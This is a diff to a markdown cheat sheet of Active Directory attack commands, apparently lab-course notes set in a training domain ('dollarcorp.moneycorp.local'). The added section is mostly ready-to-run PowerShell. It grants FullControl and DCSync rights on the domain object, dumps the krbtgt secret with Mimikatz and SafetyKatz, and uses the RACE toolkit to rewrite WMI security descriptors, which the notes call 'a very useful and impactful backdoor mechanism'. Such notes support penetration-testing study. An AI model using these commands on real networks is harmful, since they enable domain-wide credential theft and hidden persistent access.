@@ -164,7 +164,68 @@ Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1
 
 
 ---
-### ACL - Rights Abuse
+### ACL - Rights Abuse (DCSync)
+__Add FullControl rights__
+```powershell
+Add-DomainObjectAcl -TargetIdentity
+'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity
+student1 -Rights All -PrincipalDomain
+dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+```
+- Using ActiveDirectory Module and RACE:
+```powershell
+Set-ADACL -SamAccountName studentuser1 -
+DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local'
+-Right GenericAll -Verbose
+```
+__Add rights for DCSync__
+```powershell
+Add-DomainObjectAcl -TargetIdentity
+'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity
+student1 -Rights DCSync -PrincipalDomain
+dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+```
+
+- Using ActiveDirectory Module and RACE:
+```powershell
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName
+'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -
+Verbose
+```
+__Execute DCSync__
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+```powershell
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+---
+### ACL - Security Descriptors
+- It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.  
+- Administrative privileges are required for this.  
+- It, of course, works as a very useful and impactful backdoor mechanism.
+- Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:
+	- ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+- ACE for built-in administrators for WMI namespaces
+	- A;CI;CCDCLCSWRPWPRCWD;;;SID
+
+#### Attack
+ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit: `. C:\AD\Tools\RACE-master\RACE.ps1`
+- On local machine for student1:
+Set-RemoteWMI -SamAccountName student1 -Verbose
+• On remote machine for student1 without explicit credentials:
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'
+-Verbose
+• On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential
+Administrator -namespace 'root\cimv2' -Verbose
+• On remote machine remove permissions:
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2'
+-Remove -Verbose
+
+
 
 
 
